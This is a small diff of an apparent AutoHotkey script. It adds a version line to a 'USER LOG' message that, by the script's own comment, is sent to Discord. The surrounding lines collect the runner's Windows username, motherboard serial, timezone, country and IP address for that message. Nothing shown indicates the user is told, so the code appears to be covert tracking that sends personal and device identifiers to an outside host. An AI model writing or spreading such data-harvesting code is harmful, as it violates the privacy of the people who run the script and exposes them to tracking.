@@ -43,6 +43,7 @@ countryInfo := GetUserCountryAndIP(country, ip)  ; Correctly capture both countr
 
 ; Create the message to send to Discord
 message := "============================= USER LOG =============================" "`n"
+message .= "Script Version: V_._._.(M) Manual Togglable." "`n"
 message .= "Used script at " . CurrentTime . " " . timezone . "`n"
 message .= "Windows user: " . windowsUsername . "`n"
 message .= "Motherboard Serial: " . motherboardSerial . "`n"
